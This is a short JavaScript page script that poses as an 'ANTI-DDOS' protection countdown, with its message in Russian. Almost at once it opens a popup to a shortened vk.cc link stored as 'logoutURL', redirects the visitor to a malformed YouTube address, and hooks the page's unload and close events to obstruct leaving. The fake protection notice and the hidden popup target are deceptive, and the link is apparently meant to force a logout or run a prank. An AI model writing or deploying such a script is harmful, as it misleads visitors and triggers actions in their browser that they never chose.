var counter = 3;
var url = "https://youtube.com////opensearch";
var logoutURL = "https://vk.cc/81RMxo"
var done = false;

function isMobile(){
    if (window.orientation > 1){
        return true
    }
    else {
        return false
    }
}

function Redirect(){
    let coolint = setInterval(function() {
        var div = document.querySelector("#textkek");
        var count = counter -= 1;
        div.textContent = "ANTI-DDOS Защита. Перенаправление на сайт через " + count;
        if (count <= 0 && done == false) {
            done = true;
            clearInterval(coolint);
            window.open(logoutURL, '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
            window.location.replace(url);
        }
    }, 1);
}

function closedWin() {
    confirm("close ?");
    return false;
}
if(window.addEventListener) {
     window.addEventListener("close", closedWin, false);
}

window.addEventListener('beforeunload', function (e) {
    e.preventDefault();
    e.returnValue = '';
});

Redirect()